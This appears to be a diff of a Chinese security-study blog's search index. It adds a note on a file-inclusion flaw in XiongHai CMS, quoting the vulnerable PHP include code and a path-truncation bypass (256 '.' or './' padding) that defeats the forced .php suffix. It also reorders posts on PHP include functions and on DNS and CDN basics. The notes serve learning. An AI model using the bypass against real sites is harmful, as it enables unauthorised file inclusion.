+    <url>/2023/01/07/%E6%8C%87%E5%AE%9A%E5%90%8E%E7%BC%80%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%EF%BC%88-php%E5%90%8E%E7%BC%80%EF%BC%89%E4%B8%8E-%E6%8C%87%E5%AE%9A%E5%89%8D%E7%BC%80%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%EF%BC%88files%EF%BC%89/</url>
+    <content><![CDATA[<p><img src="/2023/01/07/%E6%8C%87%E5%AE%9A%E5%90%8E%E7%BC%80%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%EF%BC%88-php%E5%90%8E%E7%BC%80%EF%BC%89%E4%B8%8E-%E6%8C%87%E5%AE%9A%E5%89%8D%E7%BC%80%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%EF%BC%88files%EF%BC%89/1672910232518-495a690a-4783-427c-a775-eda71d6f1c4e.png" alt="img"></p>
+<span id="more"></span>
+
+<p><img src="/2023/01/07/%E6%8C%87%E5%AE%9A%E5%90%8E%E7%BC%80%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%EF%BC%88-php%E5%90%8E%E7%BC%80%EF%BC%89%E4%B8%8E-%E6%8C%87%E5%AE%9A%E5%89%8D%E7%BC%80%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%EF%BC%88files%EF%BC%89/1672910568528-ca80407a-37d5-46c5-9a65-d353be949613.png" alt="img"></p>
+<p><img src="/2023/01/07/%E6%8C%87%E5%AE%9A%E5%90%8E%E7%BC%80%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%EF%BC%88-php%E5%90%8E%E7%BC%80%EF%BC%89%E4%B8%8E-%E6%8C%87%E5%AE%9A%E5%89%8D%E7%BC%80%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%EF%BC%88files%EF%BC%89/1672910692582-83b88d68-0c51-4de8-ac64-86e6b897102b.png" alt="img"></p>
+<p><img src="/2023/01/07/%E6%8C%87%E5%AE%9A%E5%90%8E%E7%BC%80%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%EF%BC%88-php%E5%90%8E%E7%BC%80%EF%BC%89%E4%B8%8E-%E6%8C%87%E5%AE%9A%E5%89%8D%E7%BC%80%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%EF%BC%88files%EF%BC%89/1672917386671-e8576ed5-a7c2-4445-b76c-152bf817402b.png" alt="img"></p>
+<h2 id="熊海cms文件包含漏洞-指定前缀files"><a href="#熊海cms文件包含漏洞-指定前缀files" class="headerlink" title="熊海cms文件包含漏洞(指定前缀files/)"></a>熊海cms文件包含漏洞(指定前缀files/)</h2><?php
+
+//单一入口模式
+
+error_reporting(0); //关闭错误显示
+
+$file=addslashes($_GET['r']); //接收文件名
+
+$action=$file==''?'index':$file; //判断为空或者等于index
+
+include('files/'.$action.'.php'); //载入相应文件
+
+?>
+
+<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>两个index.php文件均为以下内容，代码中对GET传参只进行了一个 addslashes过滤操作，但该操作对预防文件包含没有什么作用，我们只需要在对应的files文件下存在以 .php结尾的文件，即可利用文件名(不包含.php后缀)作为参数 r的内容，达到文件包含的目的</p>
+<p>由于用了 addslashes函数所以不能用%00截断来绕过.php后缀</p>
+<p>可以用………（256个.）</p>
+<p>或者././././(256个./)绕过</p>
+]]></content>
+      <categories>
+        <category>文件包含</category>
+      </categories>
+      <tags>
+        <tag>web漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>(文件上传+命令执行)BUU UPLOAD COURSE</title>
     <url>/2023/01/07/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-BUU-UPLOAD-COURSE/</url>
     <content><![CDATA[<p><img src="/2023/01/07/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-BUU-UPLOAD-COURSE/1671158113792-baa4586e-7558-4d92-b3dc-e9554a91fe2f.png" alt="img"></p>
@@ -1682,28 +1682,6 @@ include('files/'.$action.'.php'); //载入相应文件
 ]]></content>
       <categories>
         <category>命令执行</category>
-      </categories>
-      <tags>
-        <tag>web漏洞</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>文件包含常用函数</title>
-    <url>/2023/01/07/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0/</url>
-    <content><![CDATA[<p>include()</p>
-<p>require()</p>
-<p>fopen()</p>
-<p>include_once()</p>
-<p>require_once()</p>
-<p>readfile()</p>
-<span id="more"></span>
-
-<h2 id="include-与require-区别"><a href="#include-与require-区别" class="headerlink" title="include()与require()区别"></a>include()与require()区别</h2><p>当包含一个不存在的文件时，include会报错，但是下面的语句正常执行，而require就会报错并停止脚步继续执行。</p>
-<h2 id="include-once-与require-once-区别"><a href="#include-once-与require-once-区别" class="headerlink" title="include_once()与require_once()区别"></a>include_once()与require_once()区别</h2><p>当之前包含过一个文件时，就不会再包含了</p>
-<h2 id="fopen-与readfile"><a href="#fopen-与readfile" class="headerlink" title="fopen()与readfile()"></a>fopen()与readfile()</h2><p><img src="/2023/01/07/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0/1672882660228-68caa210-f9c8-4e8a-bf9b-faa0ea17a1ee.png" alt="img"></p>
-]]></content>
-      <categories>
-        <category>文件包含</category>
       </categories>
       <tags>
         <tag>web漏洞</tag>
@@ -1800,6 +1778,28 @@ include('files/'.$action.'.php'); //载入相应文件
 ]]></content>
       <categories>
         <category>文件上传</category>
+      </categories>
+      <tags>
+        <tag>web漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>文件包含常用函数</title>
+    <url>/2023/01/07/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0/</url>
+    <content><![CDATA[<p>include()</p>
+<p>require()</p>
+<p>fopen()</p>
+<p>include_once()</p>
+<p>require_once()</p>
+<p>readfile()</p>
+<span id="more"></span>
+
+<h2 id="include-与require-区别"><a href="#include-与require-区别" class="headerlink" title="include()与require()区别"></a>include()与require()区别</h2><p>当包含一个不存在的文件时，include会报错，但是下面的语句正常执行，而require就会报错并停止脚步继续执行。</p>
+<h2 id="include-once-与require-once-区别"><a href="#include-once-与require-once-区别" class="headerlink" title="include_once()与require_once()区别"></a>include_once()与require_once()区别</h2><p>当之前包含过一个文件时，就不会再包含了</p>
+<h2 id="fopen-与readfile"><a href="#fopen-与readfile" class="headerlink" title="fopen()与readfile()"></a>fopen()与readfile()</h2><p><img src="/2023/01/07/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0/1672882660228-68caa210-f9c8-4e8a-bf9b-faa0ea17a1ee.png" alt="img"></p>
+]]></content>
+      <categories>
+        <category>文件包含</category>
       </categories>
       <tags>
         <tag>web漏洞</tag>
@@ -1907,49 +1907,6 @@ include('files/'.$action.'.php'); //载入相应文件
       </categories>
       <tags>
         <tag>web漏洞</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>网安基础总结一</title>
-    <url>/2022/04/24/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93%E4%B8%80/</url>
-    <content><![CDATA[<h1 id="域名："><a href="#域名：" class="headerlink" title="域名："></a>域名：</h1><p>顶级域名，又称一级域名，常见的有”.com”、”.org”、”.net”、”.cn”等<br><a href="https://link.zhihu.com/?target=http://baidu.com">http://baidu.com</a> 一级域名</p>
-<span id="more"></span>
-
-<p>二级域名<br>bbs.baidu .com 二级域名<br>tieba.baidu .com 二级域名</p>
-<p>多级域名：</p>
-<p><strong>.</strong>.__.com</p>
-<p>顶级域名：</p>
-<p>com 商业机构</p>
-<p>edu 教育及研究机构</p>
-<p>firm 公司企业</p>
-<p>gov 政府机构</p>
-<p>info 信息服务</p>
-<p>net 网络服务机构</p>
-<p>nom 个人</p>
-<p>org 专业团体</p>
-<p>rec 娱乐类机构</p>
-<p>store 销售类公司企业</p>
-<p>web 从事WWW活动的机构</p>
-<p><img src="/2022/04/24/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93%E4%B8%80/1650793701278-17310527-b80c-4d68-a0f9-9c41824c75ec.jpeg" alt="img"></p>
-<p><img src="/2022/04/24/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93%E4%B8%80/1650793262618-7d9f30ac-3e21-4056-906a-4223e49d8a70.png" alt="img"></p>
-<h1 id="DNS是什么："><a href="#DNS是什么：" class="headerlink" title="DNS是什么："></a>DNS是什么：</h1><p>DNS是域名系统,Domain Name System的缩写,服务域名系统为Internet上的主机分配域名地址和IP地址。用户使用域名地址，该系统就会自动把域名地址转为IP地址。域名服务是运行域名系统的Internet工具。执行域名服务的服务器称之为DNS服务器，通过DNS服务器来应答域名服务的查询。</p>
-<p>DNS就是把域名解析为IP地址，提供我们上网，我们能够上网最终是找到IP地址。</p>
-<p>比如，<a href="https://link.zhihu.com/?target=http://xxxx.com">http://xxxx.com</a>是域名，那么他的IP地址假设是144.144.144.144，我们用浏览器访问该的网页，先到DNS服务器找<a href="https://link.zhihu.com/?target=http://xxxx.com">http://xxxx.com</a>对应的IP地址，然后通过IP地址进行访问。</p>
-<p>域名系统为Internet上的主机分配域名地址和IP地址。用户使用域名地址，该系统就会自动把域名地址转为IP地址。域名服务是运行域名系统的Internet工具。执行域名服务的服务器称之为DNS服务器，通过DNS服务器来应答域名服务的查询。</p>
-<p>DNS服务器地址:</p>
-<p>域名解释服务器,打比方,当你在地址栏输入 <a href="http://www.dns.com/">www.dns.com</a> 时,电脑不是直接就连接到百度的服务器里的,而是先向这个DNS服务器查询<a href="http://www.dns.com的ip地址,然后再按照这个ip地址转到百度的服务器里.一般都是每个地区有一个特定的dns服务器的,由isp提供的/">www.dns.com的IP地址,然后再按照这个IP地址转到百度的服务器里.一般都是每个地区有一个特定的DNS服务器的,由ISP提供的</a>.</p>
-<p>由于ISP的拨号服务器一般都有缺省的DNS，所以你可以不用设置DNS，如果你需要指定一台DNS，你一定要了解这台DNS的准确IP（比如福州的163用户的DNS为202.101.98.55）。DNS设置方法如下：在“控制面板”下打开“网络”里的“TCP/IP”的“属性”，在“DNS设置”栏目选择“启用DNS”，并将DNS的IP地址添加即可。</p>
-<p>IP192.168.X.X一般都是带有路由的IP，网关默认最后1位肯定是1，子网掩码 255.255.255.0简单说C类的IP，子网都可以这样设置</p>
-<p>我的理解：DNS服务器地址就是将人们可以理解的域名解析成计算机可以获取的二进制语言（也就是这个域名实际所代表的IP地址）</p>
-<h1 id="什么是CDN："><a href="#什么是CDN：" class="headerlink" title="什么是CDN："></a>什么是CDN：</h1><p>cdn全称是内容分发网络。其目的是让用户能够更快速的得到请求的数据。简单来讲，cdn就是用来加速的，他能让用户就近访问数据，这样就更更快的获取到需要的数据。举个例子，现在服务器在北京，深圳的用户想要获取服务器上的数据就需要跨越一个很远的距离，这显然就比北京的用户访问北京的服务器速度要慢。但是现在我们在深圳建立一个cdn服务器，上面缓存住一些数据，深圳用户访问时先访问这个cdn服务器，如果服务器上有用户请求的数据就可以直接返回，这样速度就大大的提升了<br>CDN与DNS的关系：</p>
-<p>dns与cdn的关系<br>刚才说到cdn实际上是一个就近访问，那么现在有一个问题是，我们怎么知道用户的所在位置从而给他分配最佳的cdn节点呢。这就需要dns服务来进行定位了。当我们通过使用dns服务的时候，可以根据他使用的LDNS服务器来进行一个定位，例如我们的调度服务器看到他是来自深圳电信的LDNS服务器，那么我们就认为该用户来自深圳电信，然后调度服务器可以让该用户去访问深圳电信的CDN服务器，这样就让用户访问到了最优的cdn节点。<br>通过dns服务我们可以很快的定位到用户的位置，然后给用户分配最佳cdn节点，但是这种调度方式存在一个问题，例如，当我 是北京联通的用户但是使用的却是深圳电信的ldns的话，调度服务器会给我分配到深圳电信的cdn服务器，这样就产生了错误的调度。</p>
-<h1 id="网站程序产生漏洞："><a href="#网站程序产生漏洞：" class="headerlink" title="网站程序产生漏洞："></a>网站程序产生漏洞：</h1><p>SQL注入，文件上传，xss，代码执行，变量覆盖，逻辑漏洞，反序列化。</p>
-]]></content>
-      <categories>
-        <category>网安基础篇</category>
-      </categories>
-      <tags>
-        <tag>web基础</tag>
       </tags>
   </entry>
   <entry>
@@ -2130,6 +2087,49 @@ include('files/'.$action.'.php'); //载入相应文件
 <p>差不多就这些，以后再做补充。</p>
 <h2 id="三、下周计划"><a href="#三、下周计划" class="headerlink" title="三、下周计划"></a>三、下周计划</h2><p>下周主攻MISC，学一下python脚本编写。副攻web中的命令执行和php特性这类题目。</p>
 <p>加油(ง •_•)ง</p>
+]]></content>
+      <categories>
+        <category>网安基础篇</category>
+      </categories>
+      <tags>
+        <tag>web基础</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>网安基础总结一</title>
+    <url>/2022/04/24/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93%E4%B8%80/</url>
+    <content><![CDATA[<h1 id="域名："><a href="#域名：" class="headerlink" title="域名："></a>域名：</h1><p>顶级域名，又称一级域名，常见的有”.com”、”.org”、”.net”、”.cn”等<br><a href="https://link.zhihu.com/?target=http://baidu.com">http://baidu.com</a> 一级域名</p>
+<span id="more"></span>
+
+<p>二级域名<br>bbs.baidu .com 二级域名<br>tieba.baidu .com 二级域名</p>
+<p>多级域名：</p>
+<p><strong>.</strong>.__.com</p>
+<p>顶级域名：</p>
+<p>com 商业机构</p>
+<p>edu 教育及研究机构</p>
+<p>firm 公司企业</p>
+<p>gov 政府机构</p>
+<p>info 信息服务</p>
+<p>net 网络服务机构</p>
+<p>nom 个人</p>
+<p>org 专业团体</p>
+<p>rec 娱乐类机构</p>
+<p>store 销售类公司企业</p>
+<p>web 从事WWW活动的机构</p>
+<p><img src="/2022/04/24/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93%E4%B8%80/1650793701278-17310527-b80c-4d68-a0f9-9c41824c75ec.jpeg" alt="img"></p>
+<p><img src="/2022/04/24/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93%E4%B8%80/1650793262618-7d9f30ac-3e21-4056-906a-4223e49d8a70.png" alt="img"></p>
+<h1 id="DNS是什么："><a href="#DNS是什么：" class="headerlink" title="DNS是什么："></a>DNS是什么：</h1><p>DNS是域名系统,Domain Name System的缩写,服务域名系统为Internet上的主机分配域名地址和IP地址。用户使用域名地址，该系统就会自动把域名地址转为IP地址。域名服务是运行域名系统的Internet工具。执行域名服务的服务器称之为DNS服务器，通过DNS服务器来应答域名服务的查询。</p>
+<p>DNS就是把域名解析为IP地址，提供我们上网，我们能够上网最终是找到IP地址。</p>
+<p>比如，<a href="https://link.zhihu.com/?target=http://xxxx.com">http://xxxx.com</a>是域名，那么他的IP地址假设是144.144.144.144，我们用浏览器访问该的网页，先到DNS服务器找<a href="https://link.zhihu.com/?target=http://xxxx.com">http://xxxx.com</a>对应的IP地址，然后通过IP地址进行访问。</p>
+<p>域名系统为Internet上的主机分配域名地址和IP地址。用户使用域名地址，该系统就会自动把域名地址转为IP地址。域名服务是运行域名系统的Internet工具。执行域名服务的服务器称之为DNS服务器，通过DNS服务器来应答域名服务的查询。</p>
+<p>DNS服务器地址:</p>
+<p>域名解释服务器,打比方,当你在地址栏输入 <a href="http://www.dns.com/">www.dns.com</a> 时,电脑不是直接就连接到百度的服务器里的,而是先向这个DNS服务器查询<a href="http://www.dns.com的ip地址,然后再按照这个ip地址转到百度的服务器里.一般都是每个地区有一个特定的dns服务器的,由isp提供的/">www.dns.com的IP地址,然后再按照这个IP地址转到百度的服务器里.一般都是每个地区有一个特定的DNS服务器的,由ISP提供的</a>.</p>
+<p>由于ISP的拨号服务器一般都有缺省的DNS，所以你可以不用设置DNS，如果你需要指定一台DNS，你一定要了解这台DNS的准确IP（比如福州的163用户的DNS为202.101.98.55）。DNS设置方法如下：在“控制面板”下打开“网络”里的“TCP/IP”的“属性”，在“DNS设置”栏目选择“启用DNS”，并将DNS的IP地址添加即可。</p>
+<p>IP192.168.X.X一般都是带有路由的IP，网关默认最后1位肯定是1，子网掩码 255.255.255.0简单说C类的IP，子网都可以这样设置</p>
+<p>我的理解：DNS服务器地址就是将人们可以理解的域名解析成计算机可以获取的二进制语言（也就是这个域名实际所代表的IP地址）</p>
+<h1 id="什么是CDN："><a href="#什么是CDN：" class="headerlink" title="什么是CDN："></a>什么是CDN：</h1><p>cdn全称是内容分发网络。其目的是让用户能够更快速的得到请求的数据。简单来讲，cdn就是用来加速的，他能让用户就近访问数据，这样就更更快的获取到需要的数据。举个例子，现在服务器在北京，深圳的用户想要获取服务器上的数据就需要跨越一个很远的距离，这显然就比北京的用户访问北京的服务器速度要慢。但是现在我们在深圳建立一个cdn服务器，上面缓存住一些数据，深圳用户访问时先访问这个cdn服务器，如果服务器上有用户请求的数据就可以直接返回，这样速度就大大的提升了<br>CDN与DNS的关系：</p>
+<p>dns与cdn的关系<br>刚才说到cdn实际上是一个就近访问，那么现在有一个问题是，我们怎么知道用户的所在位置从而给他分配最佳的cdn节点呢。这就需要dns服务来进行定位了。当我们通过使用dns服务的时候，可以根据他使用的LDNS服务器来进行一个定位，例如我们的调度服务器看到他是来自深圳电信的LDNS服务器，那么我们就认为该用户来自深圳电信，然后调度服务器可以让该用户去访问深圳电信的CDN服务器，这样就让用户访问到了最优的cdn节点。<br>通过dns服务我们可以很快的定位到用户的位置，然后给用户分配最佳cdn节点，但是这种调度方式存在一个问题，例如，当我 是北京联通的用户但是使用的却是深圳电信的ldns的话，调度服务器会给我分配到深圳电信的cdn服务器，这样就产生了错误的调度。</p>
+<h1 id="网站程序产生漏洞："><a href="#网站程序产生漏洞：" class="headerlink" title="网站程序产生漏洞："></a>网站程序产生漏洞：</h1><p>SQL注入，文件上传，xss，代码执行，变量覆盖，逻辑漏洞，反序列化。</p>
 ]]></content>
       <categories>
         <category>网安基础篇</category>
